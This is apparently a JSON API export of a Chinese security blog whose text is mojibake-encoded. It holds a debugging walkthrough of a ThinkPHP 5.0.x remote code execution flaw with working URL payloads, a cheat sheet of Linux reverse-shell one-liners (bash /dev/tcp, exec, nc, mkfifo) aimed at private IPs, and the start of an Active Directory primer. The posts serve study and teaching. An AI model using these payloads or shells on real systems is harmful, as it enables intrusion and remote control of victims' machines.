{"total":14,"pageSize":10,"pageCount":2,"data":[{"title":"ThinkPHPç³»åˆ—â€”â€”æ§åˆ¶å™¨è¿‡æ»¤ä¸ä¸¥å¯¼è‡´RCEè°ƒè¯•åŠè¯¦ç»†åˆ†æ","slug":"thinkphp1","date":"2021-03-09T01:28:51.000Z","updated":"2021-03-09T06:23:22.966Z","comments":true,"path":"api/articles/thinkphp1.json","excerpt":"","keywords":null,"cover":"../static/images/image-20210309095347435.png","content":"<h1 id=\"å‰è¨€\"><a class=\"markdownIt-Anchor\" href=\"#å‰è¨€\"></a> å‰è¨€</h1>\n<p>ThinkPHPæ˜¯è®¸å¤šä¸­å°å‹ä¼ä¸šç”¨äºç½‘ç«™å¼€å‘çš„å›½äº§cmsï¼Œåœ¨2019å¹´å‡ºç°è¿‡å¤šä¸ªRCEï¼Œæœ¬äººæ­¤å‰æ²¡æœ‰è¿‡åŠ¨æ€è°ƒè¯•PHPä»£ç çš„ç»éªŒï¼Œåœ¨æœ¬æ–‡ä¸­è®°å½•é…ç½®å’Œä½¿ç”¨è¿‡ç¨‹ä¾›å¤§å®¶å­¦ä¹ å‚è€ƒã€‚</p>\n<p>æœ¬æ–‡æ‰€æœ‰ç¯å¢ƒäºArchLinuxç³»ç»Ÿæ­å»ºï¼Œå…¶ä»–ç³»ç»Ÿé…ç½®æ–¹æ³•å¤§åŒå°å¼‚ã€‚</p>\n<h1 id=\"é…ç½®nginx-php-73-phpstorm-xdebug-è¿›è¡Œæºç è°ƒè¯•\"><a class=\"markdownIt-Anchor\" href=\"#é…ç½®nginx-php-73-phpstorm-xdebug-è¿›è¡Œæºç è°ƒè¯•\"></a> é…ç½®Nginx + PHP 7.3 + PHPStorm + Xdebug è¿›è¡Œæºç è°ƒè¯•</h1>\n<p>æœ¬ç« å°†ä»‹ç»å¦‚ä½•é…ç½®è°ƒè¯•ç¯å¢ƒï¼Œå¦‚æœå·²ç»å…·å¤‡è¯¥æ¡ä»¶çš„è¯·è‡ªè¡Œè·³è¿‡ã€‚å®‰è£…php 7.3ç¯å¢ƒï¼ˆphp 8.xä»¥ä¸Šå¼ƒç”¨äº†getClasså‡½æ•°ï¼Œå¤ç°è¿‡ç¨‹ä¼šå‡ºé—®é¢˜ï¼‰ï¼š</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ALL_PROXY&#x3D;socks5:&#x2F;&#x2F;127.0.0.1:10808 yay -S php73 php73-fpm aur&#x2F;php73-xdebug #ç”±äºå›½å†…ç½‘ç»œç¯å¢ƒé—®é¢˜é…ç½®äº†ä»£ç†</span><br></pre></td></tr></table></figure>\n<p>ä¿®æ”¹æ–‡ä»¶/etc/php73/conf.d/xdebug.ini ï¼ˆæ²¡æœ‰å°±å»ºä¸€ä¸ªï¼‰ï¼š</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">zend_extension&#x3D;&#x2F;lib&#x2F;php73&#x2F;modules&#x2F;xdebug.so</span><br><span class=\"line\">xdebug.remote_enable&#x3D;on</span><br><span class=\"line\">xdebug.remote_host&#x3D;127.0.0.1</span><br><span class=\"line\">xdebug.remote_port&#x3D;9000</span><br><span class=\"line\">xdebug.client_port&#x3D;9003</span><br><span class=\"line\">xdebug.remote_handler &#x3D; &quot;dbgp&quot;</span><br><span class=\"line\">xdebug.idekey &#x3D; PHPSTORM</span><br><span class=\"line\">xdebug.auto_trace&#x3D;1</span><br><span class=\"line\">xdebug.collect_params&#x3D;1</span><br><span class=\"line\">xdebug.collect_return&#x3D;1</span><br><span class=\"line\">xdebug.profiler_enable &#x3D; 1</span><br><span class=\"line\">xdebug.profiler_output_name &#x3D; &quot;cachegrind.out.%t.%p&quot;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>ä¿®æ”¹/etc/php73/php.iniï¼Œéšä¾¿åœ¨å¼€å¤´åŠ ä¸€è¡Œï¼š</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">xdebug.mode&#x3D;debug</span><br></pre></td></tr></table></figure>\n<p>ä¿®æ”¹/etc/php73/php-fpm.d/www.conf,æ·»åŠ ä¸€è¡Œï¼š</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">listen &#x3D; 127.0.0.1:9001 </span><br></pre></td></tr></table></figure>\n<p>ä¿®æ”¹/etc/nginx/nginx.confä¸­å¯¹åº”çš„éƒ¨åˆ†ï¼š</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">   location ~ \\.php$ &#123;</span><br><span class=\"line\">        try_files $uri &#x3D;404;</span><br><span class=\"line\"></span><br><span class=\"line\">        include fastcgi.conf;</span><br><span class=\"line\">        fastcgi_pass 127.0.0.1:9001;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>æ­¤<a href=\"http://www.thinkphp.cn/download/1260.html\">é¡µé¢</a>ä¸‹è½½thinkphp 5.2æºç ï¼Œç„¶åè§£å‹è‡³/usr/share/nginx/htmlï¼Œæ–‡ä»¶ç»“æ„å¦‚ä¸‹ï¼š</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">share&#x2F;nginx&#x2F;html via ğŸ˜ </span><br><span class=\"line\">â¯ ls </span><br><span class=\"line\">application&#x2F;  build.php*  composer.json*  composer.lock*  extend&#x2F;  LICENSE.txt*  public&#x2F;  README.md*  runtime&#x2F;  test.php*  think*  thinkphp&#x2F;  tmp&#x2F;  vendor&#x2F;</span><br></pre></td></tr></table></figure>\n<p>é‡å¯nginxå’Œphp-fpmï¼š</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">systemctl restart php73-fpm</span><br><span class=\"line\">systemctl restart nginx.service</span><br></pre></td></tr></table></figure>\n<p>èƒ½è®¿é—®http://127.0.0.1/public/index.phpè¯´æ˜nginx+php7.3é…ç½®çš„æ²¡é—®é¢˜ï¼š</p>\n<p><img src=\"../static/images/image-20210309095347435.png\" alt=\"image-20210309095347435\" /></p>\n<p>åœ¨æ ¹ç›®å½•æ–°å»ºä¸ªtest.phpï¼š</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">phpinfo();</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n<p>èƒ½çœ‹åˆ°xdebugè¯´æ˜xdebugæ²¡å•¥é—®é¢˜ï¼š</p>\n<p><img src=\"../static/images/image-20210309095521032.png\" alt=\"image-20210309095521032\" /></p>\n<p>PHPStorméœ€è¦åŠ ä¸‰ä¸ªé…ç½®ï¼š</p>\n<p><img src=\"../static/images/image-20210309095603856.png\" alt=\"image-20210309095603856\" /></p>\n<p><img src=\"../static/images/image-20210309095626043.png\" alt=\"image-20210309095626043\" /></p>\n<p><img src=\"../static/images/image-20210309095639471.png\" alt=\"image-20210309095639471\" /></p>\n<p>ä¾æ¬¡ç‚¹å¼€ï¼š</p>\n<p><img src=\"../static/images/image-20210309095822596.png\" alt=\"image-20210309095822596\" /></p>\n<p>åŸºæœ¬éƒ½æ˜¯å¯¹çš„å°±æ²¡å•¥é—®é¢˜ï¼ˆ9003é‚£ä¸ªä¸ç”¨ç®¡ä»–ï¼Œç„¶åæœ‰å…¶ä»–æŠ¥é”™æ ¹æ®æç¤ºæ”¹å°±æ˜¯äº†ï¼Œæˆ‘ç´¯äº†ï¼‰ï¼š</p>\n<p><img src=\"../static/images/image-20210309095900514.png\" alt=\"image-20210309095900514\" /></p>\n<p>ç„¶åè¿™ä¸¤ä¸ªå„å¼€ä¸€ä¸‹debugå°±è¡Œäº†ï¼š</p>\n<p><img src=\"../static/images/image-20210309095929909.png\" alt=\"image-20210309095929909\" /></p>\n<h1 id=\"æœªå¼€å¯å¼ºåˆ¶è·¯ç”±å¯¼è‡´rce\"><a class=\"markdownIt-Anchor\" href=\"#æœªå¼€å¯å¼ºåˆ¶è·¯ç”±å¯¼è‡´rce\"></a> æœªå¼€å¯å¼ºåˆ¶è·¯ç”±å¯¼è‡´rce</h1>\n<p>5.0.x payloadï¼š</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?s&#x3D;index&#x2F;\\think\\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;id</span><br><span class=\"line\">?s&#x3D;index&#x2F;think\\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;whoami</span><br></pre></td></tr></table></figure>\n<p>5.0.xä¸5.1.x payloadä¸åŒï¼Œæœ¬ç« åªåˆ†æ5.0.22ç‰ˆæœ¬å¯¹åº”çš„æºç ã€‚</p>\n<p>ä»<a href=\"https://github.com/top-think/framework/commit/802f284bec821a608e7543d91126abc5901b2815\">ä¿®å¤</a>çœ‹é€ æˆæ¼æ´å¤„ï¼š</p>\n<p><img src=\"../static/images/image-20210309104235268.png\" alt=\"image-20210309104235268\" /></p>\n<p>å³/Index/think\\app/invokefunctionä¸­çš„think\\appéƒ¨åˆ†ï¼Œå¿…é¡»ä¸ºï¼š</p>\n<p>å­—æ¯å¼€å¤´ ä¸” åˆ°æœ«å°¾å¿…é¡»éƒ½ä¸ºæ•°å­—å­—æ¯ï¼ŒæŠŠ&quot;\\â€œç»™è¿‡æ»¤æ‰äº†ï¼Œthink\\appå› ä¸ºåŒ…å«â€\\&quot;ï¼Œå› æ­¤åœ¨åç»­ç‰ˆæœ¬ä¸­ä¼šæŠ¥é”™ã€‚</p>\n<p>é‚£ä¹ˆåˆ†ææ¼æ´å…³é”®çš„éƒ¨åˆ†å°±æ˜¯æ€ä¹ˆè§£æ&quot;\\&quot;è¿™é‡Œã€‚</p>\n<p>åœ¨thinkphp-&gt;library-&gt;think-&gt;APP.php ç¬¬553è¡Œæ‰“æ–­ç‚¹ï¼š</p>\n<p><img src=\"../static/images/image-20210309101330291.png\" alt=\"image-20210309101330291\" /></p>\n<p>æ ¹æ®553ï¼Œ557è¡Œä»¥åŠ$resultæ•°ç»„ï¼Œæˆ‘ä»¬å¯ä»¥çŸ¥é“index/think\\app/invokefunctionåˆ†åˆ«å¯ä»¥æŒ‡å®šï¼š</p>\n<p>æ§åˆ¶å™¨ $controller ä¸º think\\app</p>\n<p>æ“ä½œå $actionName ä¸º invokefunction</p>\n<p>565è¡Œï¼Œæ ¹æ®$controllerå’Œ$actionNameï¼Œè®¾ç½®å½“å‰è¯·æ±‚çš„æ“ä½œå™¨ï¼š</p>\n<p><img src=\"../static/images/image-20210309102136758.png\" alt=\"image-20210309102136758\" /></p>\n<p><img src=\"../static/images/image-20210309102153169.png\" alt=\"image-20210309102153169\" /></p>\n<p>å‰é¢éƒ½æ˜¯è®¾ç½®ä¸€äº›å‚æ•°çš„ï¼Œ571è¡Œè¿™é‡Œè·Ÿä¸€ä¸‹Loader::controllerï¼ŒLoader.phpçš„476è¡Œä¸­æœ‰ä¸ªgetModuleAndClasså‡½æ•°ï¼š</p>\n<p><img src=\"../static/images/image-20210309112648259.png\" alt=\"image-20210309112648259\" /></p>\n<p>479è¡Œè¿™é‡Œæœ‰ä¸ªinvokeClassï¼š</p>\n<p><img src=\"../static/images/image-20210309113148298.png\" alt=\"image-20210309113148298\" /></p>\n<p>è·Ÿè¿›å»ï¼Œå‘ç°å…¶å†…å®¹æ˜¯ä¸€ä¸ªåå°„ç±»çš„è¿‡ç¨‹ï¼Œè¿™é‡ŒæŠŠæˆ‘ä»¬æŒ‡å®šçš„classï¼Œä¹Ÿå°±æ˜¯think\\appæŒ‡å®šçš„ç±»ï¼Œä¼ ç»™äº†$constructorï¼š</p>\n<p><img src=\"../static/images/image-20210309113648190.png\" alt=\"image-20210309113648190\" /></p>\n<p>åå°„å¯å‚è€ƒ<a href=\"https://www.php.net/manual/zh/class.reflectionclass.php\">å®˜æ–¹æ‰‹å†Œ</a>ï¼Œæœ€åè¿”å›åˆ°APP.phpè¿™é‡Œï¼Œ$instanceå°±å˜æˆäº†think\\appçš„å®ä¾‹åŒ–ï¼š</p>\n<p><img src=\"../static/images/image-20210309114205321.png\" alt=\"image-20210309114205321\" /></p>\n<p>ä¸€è·¯è·Ÿåˆ°APP.phpç¬¬606è¡Œï¼Œè·ŸéšinvokeMethodå‡½æ•°ï¼Œç„¶åè·ŸéšbindParamså‡½æ•°ï¼š</p>\n<p><img src=\"../static/images/image-20210309114944995.png\" alt=\"image-20210309114944995\" /></p>\n<p>å¦‚æœå‚æ•°ä¸ºç©ºï¼Œé‚£ä¹ˆå°±ä¼šæ ¹æ®è·¯ç”±æ¥è·å–å‚æ•°ï¼Œå…¶ä¸­ä¼šè¿‡æ»¤ä¸€äº›ç‰¹æ®Šå­—ç¬¦ï¼Œæ³¨æ„ä¸€ä¸‹ï¼š</p>\n<p><img src=\"../static/images/image-20210309115346300.png\" alt=\"image-20210309115346300\" /></p>\n<p>ç„¶åæ ¹æ®æˆ‘ä»¬è¾“å…¥çš„å‚æ•°åï¼Œå€¼ä½œä¸ºè¿”å›å€¼ï¼Œå¯¹åº”function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=idï¼š</p>\n<p><img src=\"../static/images/image-20210309115507308.png\" alt=\"image-20210309115507308\" /></p>\n<p>åˆ°InvokeArgè¿™é‡Œï¼š</p>\n<p><img src=\"../static/images/image-20210309120040834.png\" alt=\"image-20210309120040834\" /></p>\n<p>è¿™é‡Œå°±ä¼šæŠŠsystem å’Œ å‚æ•°ä½œä¸ºè¾“å…¥ç»§ç»­è°ƒç”¨ï¼Œæœ€åæ‰§è¡Œçš„ç»“æœä¼šè¿”å›åˆ°Responseä¸­ï¼š</p>\n<p><img src=\"../static/images/image-20210309115903673.png\" alt=\"image-20210309115903673\" /></p>\n<p>æµç¨‹æ€»ç»“ï¼š</p>\n<p>å½“thinkphpä»uriçš„å‚æ•°sä¸­æ¥å—åˆ°</p>\n<p>Index/think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=or</p>\n<p>æ—¶ï¼Œthink\\appä½œä¸ºclassï¼Œinvokefunctionä½œä¸ºreflect methodè¢«è°ƒç”¨ï¼Œ</p>\n<p>è€Œé»˜è®¤é…ç½®ä¸‹ï¼Œurl_param_type = 0æ—¶ï¼Œå…¶å°†ä»å‚æ•°ä¸­è·å–reflect methodçš„å‚æ•°</p>\n<p>systemä½œä¸ºinvokefunctionå‡½æ•°invokeçš„å‡½æ•°ï¼Œè€Œvars[]æ•°ç»„ä¸ºsystemå‡½æ•°çš„è¾“å…¥è¢«è°ƒç”¨ï¼Œå› æ­¤é€ æˆè¿œç¨‹ä»£ç æ‰§è¡Œã€‚</p>\n<p>ä¿®å¤åï¼Œthinkphpä¸å…è®¸ä½¿ç”¨å¸¦åæ–œæ çš„ç±»æ¥å®šä¹‰ï¼Œé™åˆ¶äº†æ”»å‡»è€…åˆ©ç”¨é“¾è·¯ï¼Œå› æ­¤ä¿®è¡¥äº†è¯¥é—®é¢˜ã€‚</p>\n<h1 id=\"reference\"><a class=\"markdownIt-Anchor\" href=\"#reference\"></a> Reference</h1>\n<p>[1] <a href=\"https://www.php.net/manual/zh/class.reflectionclass.php\">https://www.php.net/manual/zh/class.reflectionclass.php</a></p>\n<p>[2] <a href=\"http://www.thinkphp.cn/download/1260.html\">http://www.thinkphp.cn/download/1260.html</a></p>\n<p>[3] <a href=\"https://blog.csdn.net/KSalomo/article/details/106055536\">https://blog.csdn.net/KSalomo/article/details/106055536</a></p>\n<p>[4] <a href=\"https://github.com/top-think/framework/commit/802f284bec821a608e7543d91126abc5901b2815\">https://github.com/top-think/framework/commit/802f284bec821a608e7543d91126abc5901b2815</a></p>\n<p>[5] <a href=\"https://xz.aliyun.com/t/3570#toc-0\">https://xz.aliyun.com/t/3570#toc-0</a></p>\n<p>[6] <a href=\"https://xz.aliyun.com/t/7792#toc-0\">https://xz.aliyun.com/t/7792#toc-0</a></p>\n","text":" å‰è¨€ThinkPHPæ˜¯è®¸å¤šä¸­å°å‹ä¼ä¸šç”¨äºç½‘ç«™å¼€å‘çš„å›½äº§cmsï¼Œåœ¨2019å¹´å‡ºç°è¿‡å¤šä¸ªRCEï¼Œæœ¬äººæ­¤å‰æ²¡æœ‰è¿‡åŠ¨æ€è°ƒè¯•PHPä»£ç çš„ç»éªŒï¼Œåœ¨æœ¬æ–‡ä¸­è®°å½•é…ç½®å’Œä½¿ç”¨è¿‡ç¨‹ä¾›å¤§å®¶å­¦ä¹ å‚è€ƒã€‚æœ¬æ–‡æ‰€æœ‰ç¯å¢ƒäºArchLinuxç³»ç»Ÿæ­å»ºï¼Œå…¶ä»–ç³»ç»Ÿé…ç½®æ–¹æ³•å¤§åŒå°å¼‚ã€‚ é…ç½®Nginx + PHP 7.3","link":"","raw":null,"photos":[],"categories":[],"tags":[{"name":"æ¸—é€ RCE","slug":"æ¸—é€-RCE","count":2,"path":"api/tags/æ¸—é€-RCE.json"}]},{"title":"Linuxåå¼¹shellå°ç»“","slug":"ReverseShell","date":"2021-03-07T14:19:20.000Z","updated":"2021-03-07T15:01:40.503Z","comments":true,"path":"api/articles/ReverseShell.json","excerpt":"","keywords":null,"cover":"../static/images/image-20210307223405682.png","content":"<h1 id=\"linuxä¸€åˆ‡çš†æ–‡ä»¶\"><a class=\"markdownIt-Anchor\" href=\"#linuxä¸€åˆ‡çš†æ–‡ä»¶\"></a> Linuxä¸€åˆ‡çš†æ–‡ä»¶</h1>\n<p>Linuxæ–‡ä»¶æè¿°ç¬¦ï¼šlinuxè·Ÿè¸ªæ‰“å¼€æ–‡ä»¶åè¿”å›ä¸€ä¸ªå¥æŸ„ï¼Œé€šè¿‡è¿™ä¸ªå¥æŸ„å¯ä»¥å®ç°è¯»å†™æ“ä½œã€‚</p>\n<p>Linuxå¯åŠ¨æ—¶ä¼šé»˜è®¤æ‰“å¼€ä¸‰ä¸ªæ–‡ä»¶æè¿°ç¬¦ï¼Œåˆ†åˆ«ä¸ºï¼š</p>\n<ul>\n<li>æ ‡å‡†è¾“å…¥ stdin\t\t0 ï¼ˆé»˜è®¤è®¾å¤‡é”®ç›˜ï¼‰</li>\n<li>æ ‡å‡†è¾“å‡º stdout     1 ï¼ˆé»˜è®¤è®¾å¤‡æ˜¾ç¤ºå™¨ï¼‰</li>\n<li>é”™è¯¯è¾“å‡º stderr      2 ï¼ˆé»˜è®¤è®¾å¤‡æ˜¾ç¤ºå™¨ï¼‰</li>\n</ul>\n<p>ä¸€æ¡å‘½ä»¤æ‰§è¡Œä»¥å‰å…ˆä¼šæŒ‰ç…§é»˜è®¤çš„æƒ…å†µè¿›è¡Œç»‘å®šï¼ˆä¹Ÿå°±æ˜¯ä¸Šé¢æ‰€è¯´çš„ 0,1,2ï¼‰ï¼Œå¦‚æœæˆ‘ä»¬æœ‰æ—¶å€™éœ€è¦è®©è¾“å‡ºä¸æ˜¾ç¤ºåœ¨æ˜¾ç¤ºå™¨ä¸Šï¼Œè€Œæ˜¯è¾“å‡ºåˆ°æ–‡ä»¶æˆ–è€…å…¶ä»–è®¾å¤‡ï¼Œé‚£æˆ‘ä»¬å°±éœ€è¦é‡å®šå‘ã€‚</p>\n<ul>\n<li>è¾“å…¥é‡å®šå‘ï¼š &lt;&lt;</li>\n<li>è¾“å‡ºé‡å®šå‘ï¼š &gt;&gt;</li>\n</ul>\n<p>è¿˜æœ‰å°±æ˜¯&gt;&amp;è¿™ä¸ªç¬¦å·çš„å«ä¹‰:</p>\n<ul>\n<li>å½“&gt;&amp;åé¢æ¥æ–‡ä»¶æ—¶ï¼Œè¡¨ç¤ºå°†æ ‡å‡†è¾“å‡ºå’Œæ ‡å‡†é”™è¯¯è¾“å‡ºé‡å®šå‘è‡³æ–‡ä»¶ã€‚</li>\n<li>å½“&gt;&amp;åé¢æ¥æ–‡ä»¶æè¿°ç¬¦æ—¶ï¼Œè¡¨ç¤ºå°†å‰é¢çš„æ–‡ä»¶æè¿°ç¬¦é‡å®šå‘è‡³åé¢çš„æ–‡ä»¶æè¿°ç¬¦</li>\n</ul>\n<h1 id=\"linuxåå¼¹shellåŸç†\"><a class=\"markdownIt-Anchor\" href=\"#linuxåå¼¹shellåŸç†\"></a> Linuxåå¼¹shellåŸç†</h1>\n<p>bashåå¼¹shellå‘½ä»¤ï¼š</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">bash -i &gt;&amp;&#x2F;dev&#x2F;tcp&#x2F;192.168.5.3&#x2F;6666 0&gt;&amp;1</span><br></pre></td></tr></table></figure>\n<p>å‘½ä»¤ä¸­ï¼Œbash -i äº§ç”Ÿä¸€ä¸ªäº¤äº’å¼shell</p>\n<p>&gt;&amp;/dev/tcp/192.168.5.3/6666 å»ºç«‹tcpè¿æ¥ï¼Œå°†æ ‡å‡†è¾“å‡ºå’Œé”™è¯¯è¾“å‡ºé‡å®šå‘åˆ°socketå¥—æ¥å­—ä¸Šã€‚</p>\n<p>0&gt;&amp;1 å°†æ ‡å‡†è¾“å…¥é‡å®šå‘åˆ°æ ‡å‡†è¾“å‡ºï¼Œä¹Ÿå°±æ˜¯æœ€ç»ˆé‡å®šå‘åˆ°äº†tcpè¿æ¥ä¸­</p>\n<h2 id=\"å°å®éªŒ\"><a class=\"markdownIt-Anchor\" href=\"#å°å®éªŒ\"></a> å°å®éªŒ</h2>\n<p>æˆ‘ä»¬å»æ‰stdinçš„é‡å®šå‘ï¼Œå‡è®¾æˆ‘ä»¬ä»ä¸»æœºAå‘ä¸»æœºBåå¼¹shellï¼š</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">bash -i &gt;&amp;&#x2F;dev&#x2F;tcp&#x2F;192.168.5.3&#x2F;6666</span><br></pre></td></tr></table></figure>\n<p><img src=\"../static/images/image-20210307223405682.png\" alt=\"image-20210307223405682\" /></p>\n<p>è¾“å…¥åªèƒ½åœ¨Aä¸»æœºçš„shellä¸­è¾“å…¥ï¼Œè€Œæ‰€æœ‰è¾“å‡ºéƒ½åœ¨Bä¸»æœºä¸Šæ‰å¯ä»¥çœ‹åˆ°ã€‚ï¼ˆå°±æ˜¯Bä¸»æœºä¸èƒ½å†™å‘½ä»¤äº†ï¼‰</p>\n<p>æ¢ä¸ªæ–¹å‘ï¼Œåªé‡å®šå‘stdinï¼š</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">bash -i &lt; &#x2F;dev&#x2F;tcp&#x2F;192.168.5.3&#x2F;6666</span><br></pre></td></tr></table></figure>\n<p><img src=\"../static/images/image-20210307224319957.png\" alt=\"image-20210307224319957\" /></p>\n<p>é‚£å°±åªèƒ½Bä¸»æœºè¾“å…¥å‘½ä»¤ï¼ŒAä¸»æœºæŸ¥çœ‹å›æ˜¾ç»“æœ</p>\n<h1 id=\"å¸¸è§åå¼¹shellæ–¹æ³•\"><a class=\"markdownIt-Anchor\" href=\"#å¸¸è§åå¼¹shellæ–¹æ³•\"></a> å¸¸è§åå¼¹shellæ–¹æ³•</h1>\n<p>bashåå¼¹shell</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">bash -i&gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.146.129&#x2F;2333 0&gt;&amp;1</span><br><span class=\"line\">bash -i&gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.146.129&#x2F;2333 0&lt;&amp;1</span><br></pre></td></tr></table></figure>\n<p>execç»‘å®šåå¼¹</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">exec 5&lt;&gt;&#x2F;dev&#x2F;tcp&#x2F;192.168.146.129&#x2F;8000;cat &lt;&amp;5|while read line;do $line &gt;&amp;5 2&gt;&amp;1;done</span><br><span class=\"line\">0&lt;&amp;196;exec 196&lt;&gt;&#x2F;dev&#x2F;tcp&#x2F;192.168.146.129&#x2F;8000; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196</span><br></pre></td></tr></table></figure>\n<p>ncåå¼¹shell</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nc -e &#x2F;bin&#x2F;sh 192.168.146.129 8000 </span><br><span class=\"line\">rm &#x2F;tmp&#x2F;f;mkfifo &#x2F;tmp&#x2F;f;cat &#x2F;tmp&#x2F;f|&#x2F;bin&#x2F;sh -i 2&gt;&amp;1|nc 192.168.146.129 2333 &gt;&#x2F;tmp&#x2F;f</span><br><span class=\"line\">mknod backpipe p; nc 192.168.146.129 2333 0&lt;backpipe | &#x2F;bin&#x2F;bash 1&gt;backpipe 2&gt;backpipe</span><br><span class=\"line\">nc 192.168.146.129 9000|&#x2F;bin&#x2F;bash|nc192.168.146.129 8000</span><br></pre></td></tr></table></figure>\n<h1 id=\"reference\"><a class=\"markdownIt-Anchor\" href=\"#reference\"></a> Reference</h1>\n<p><a href=\"https://www.cnblogs.com/-qing-/p/11247720.html\">https://www.cnblogs.com/-qing-/p/11247720.html</a></p>\n","text":" Linuxä¸€åˆ‡çš†æ–‡ä»¶Linuxæ–‡ä»¶æè¿°ç¬¦ï¼šlinuxè·Ÿè¸ªæ‰“å¼€æ–‡ä»¶åè¿”å›ä¸€ä¸ªå¥æŸ„ï¼Œé€šè¿‡è¿™ä¸ªå¥æŸ„å¯ä»¥å®ç°è¯»å†™æ“ä½œã€‚Linuxå¯åŠ¨æ—¶ä¼šé»˜è®¤æ‰“å¼€ä¸‰ä¸ªæ–‡ä»¶æè¿°ç¬¦ï¼Œåˆ†åˆ«ä¸ºï¼šæ ‡å‡†è¾“å…¥ stdin\t\t0 ï¼ˆé»˜è®¤è®¾å¤‡é”®ç›˜ï¼‰æ ‡å‡†è¾“å‡º stdout     1 ï¼ˆé»˜è®¤è®¾å¤‡æ˜¾ç¤ºå™¨ï¼‰é”™è¯¯è¾“å‡º stder","link":"","raw":null,"photos":[],"categories":[],"tags":[{"name":"æ¸—é€ RCE","slug":"æ¸—é€-RCE","count":2,"path":"api/tags/æ¸—é€-RCE.json"}]},{"title":"åˆæ¢WindowsåŸŸ2â€”â€”NTMLåè®®å’ŒKerberosåè®®åŸºç¡€","slug":"WindowsDomain_2","date":"2021-03-07T12:10:15.000Z","updated":"2021-03-07T14:20:17.830Z","comments":true,"path":"api/articles/WindowsDomain_2.json","excerpt":"<h1 id=\"active-directory\"><a class=\"markdownIt-Anchor\" href=\"#active-directory\"></a> Active Directory</h1>\n<p>Active Directoryå­˜å‚¨äº†æœ‰å…³ç½‘ç»œå¯¹è±¡çš„ä¿¡æ¯ï¼Œå¹¶ä¸”è®©ç®¡ç†å‘˜å’Œç”¨ æˆ·èƒ½å¤Ÿè½»æ¾åœ°æŸ¥æ‰¾å’Œä½¿ç”¨è¿™äº›ä¿¡æ¯ã€‚Active Directoryä½¿ç”¨äº†ä¸€ç§ ç»“æ„åŒ–çš„æ•°æ®å­˜å‚¨æ–¹å¼ï¼Œå¹¶ä»¥æ­¤ä½œä¸ºåŸºç¡€å¯¹ç›®å½•ä¿¡æ¯è¿›è¡Œåˆä¹é€» è¾‘çš„åˆ†å±‚ç»„ç»‡ã€‚</p>\n<p>ç½‘ç»œå¯¹è±¡åˆ†ä¸º:ç”¨æˆ·ã€ç”¨æˆ·ç»„ã€è®¡ç®—æœºã€åŸŸã€ç»„ç»‡å•ä½ä»¥åŠå®‰å…¨ç­–ç•¥ç­‰ã€‚</p>","keywords":null,"cover":"../static/images/image-20210307201435143.png","content":null,"text":" Active DirectoryActive Directoryå­˜å‚¨äº†æœ‰å…³ç½‘ç»œå¯¹è±¡çš„ä¿¡æ¯ï¼Œå¹¶ä¸”è®©ç®¡ç†å‘˜å’Œç”¨ 